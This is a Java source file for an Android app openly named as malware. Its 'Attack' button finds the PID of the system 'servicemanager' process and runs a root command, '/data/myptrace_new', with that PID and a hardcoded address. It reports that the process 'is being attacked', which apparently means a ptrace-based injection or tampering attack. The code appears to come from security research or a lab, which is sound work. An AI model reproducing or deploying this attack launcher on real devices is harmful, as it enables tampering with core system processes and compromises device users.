package com.example.malwarenativeapp;

import com.example.malwarenativeapp.RunScript;
import com.example.malwarenativeapp.NativeLib;
import com.example.malwarenativeapp.Shell.ShellException;

import android.os.Bundle;
import android.app.Activity;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.support.v4.app.NavUtils;

public class MalwareNativeAppActivity extends Activity {
	NativeLib nativeLib;

    @Override
    public void onCreate(Bundle savedInstanceState) {
    	
    	
        super.onCreate(savedInstanceState);
        setContentView(R.layout.malware_application);
  
        nativeLib = new NativeLib();        
    
        /*
        // Checking if Device is rooted or Not ?? 
        Button buttonRooting = (Button) findViewById(R.id.Rooting);

        buttonRooting.setOnClickListener (new OnClickListener() { 
          	TextView result1 = (TextView) findViewById(R.id.editText1);
    	
        	public void onClick(View v) {
        		String resStr;
  
        		resStr = new RunScript("").runItRoot ("");
        		result1.setText(resStr);
        	}
        	
      });
       */
        
        // Attack Button ...
        Button buttonAttack = (Button) findViewById(R.id.button1);

        buttonAttack.setOnClickListener (new OnClickListener() { 
          	// TextView result2 = (TextView) findViewById(R.id.attackResult);
          	EditText value1 = (EditText) findViewById(R.id.editText1);
          	EditText value2 = (EditText) findViewById(R.id.editText2);     	
    	
        	public void onClick(View v) {
        		long res = 0;
        		int v1 = 0, v2 = 0;
        		String resStr;
                int pid = 0;	
                
        		pid = getPID("servicemanager");
        		
        		// v1 = Integer.parseInt(value1.getText().toString());
        		// v2 = Integer.parseInt(value2.getText().toString());  
        		v2 = 134515216;
                
        		// resStr = new RunScript("").runOtherRootCommands("/data/myptrace_new 1 "+ pid + " " + v2);
        		        		
        		value1.setText(new Integer(pid).toString());
        		value2.setText("Service Manager Process is being attacked!");
        		
        		if(pid > 0)
        			resStr = new RunScript("").runOtherRootCommands("/data/myptrace_new 1 "+ pid + " " + v2);
        		
        	}
      });
    
        
     }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
    	getMenuInflater().inflate(R.menu.activity_main, menu);
    	return true;
    }
    
    
     
    // Utility function ...
    int getPID(String processName) {
  	  
  	  String pidStringLine;
  	  int retpid = 0;
  	  
  	  pidStringLine = new RunScript("").runIt("ps servicemanager");
  	  retpid = Integer.parseInt(pidStringLine.substring(71, 75));

        return (retpid);
    }

}